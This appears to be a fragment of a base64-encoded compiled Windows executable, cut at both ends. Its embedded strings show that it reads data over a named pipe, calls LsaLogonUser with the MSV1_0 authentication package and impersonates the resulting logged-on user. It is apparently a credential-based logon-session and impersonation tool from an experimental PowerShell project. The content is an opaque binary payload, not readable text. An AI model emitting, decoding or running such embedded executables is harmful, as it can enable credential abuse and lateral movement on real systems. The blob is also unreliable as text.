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AOUAQ3JlYXRlTXV0ZXhXAABuBVNsZWVwADEGbHN0cmxlblcAAEtFUk5FTDMyLmRsbAAA0wFMc2FOdFN0YXR1c1RvV2luRXJyb3IAEgJPcGVuUHJvY2Vzc1Rva2VuAABvAUdldFRva2VuSW5mb3JtYXRpb24AiQFJbXBlcnNvbmF0ZUxvZ2dlZE9uVXNlcgBBRFZBUEkzMi5kbGwAANMCP19XaW5lcnJvcl9tYXBAc3RkQEBZQVBFQkRIQFoAvgI/X1N5c2Vycm9yX21hcEBzdGRAQFlBUEVCREhAWgDXAj9fWGJhZF9hbGxvY0BzdGRAQFlBWFhaANsCP19Yb3V0X29mX3JhbmdlQHN0ZEBAWUFYUEVCREBaAADaAj9fWGxlbmd0aF9lcnJvckBzdGRAQFlBWFBFQkRAWgAA9wI/Y291dEBzdGRAQDNWPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQDFAQQAAjQM/ZW5kbEBzdGRAQFlBQUVBVj8kYmFzaWNfb3N0cmVhbUBEVT8kY2hhcl90cmFpdHNAREBzdGRAQEAxQEFFQVYyMUBAWgAAowM/Zmx1c2hAPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUVBQUFFQVYxMkBYWgD/BD9zZXRzdGF0ZUA/JGJhc2ljX2lvc0BEVT8kY2hhcl90cmFpdHNAREBzdGRAQEBzdGRAQFFFQUFYSF9OQFoAhAI/X09zZnhAPyRiYXNpY19vc3RyZWFtQERVPyRjaGFyX3RyYWl0c0BEQHN0ZEBAQHN0ZEBAUUVBQVhYWgBcBT91bmNhdWdodF9leGNlcHRpb25Ac3RkQEBZQV9OWFoAGAU/c3B1dGNAPyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBSERAWgAAGwU/c3B1dG5APyRiYXNpY19zdHJlYW1idWZARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBX0pQRUJEX0pAWgAAAQE/PzY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBQUVBVjAxQEtAWgAAAAE/PzY/JGJhc2ljX29zdHJlYW1ARFU/JGNoYXJfdHJhaXRzQERAc3RkQEBAc3RkQEBRRUFBQUVBVjAxQEpAWgAA/gA/PzY/JGJhc2ljX29zdHJlYW1ARFU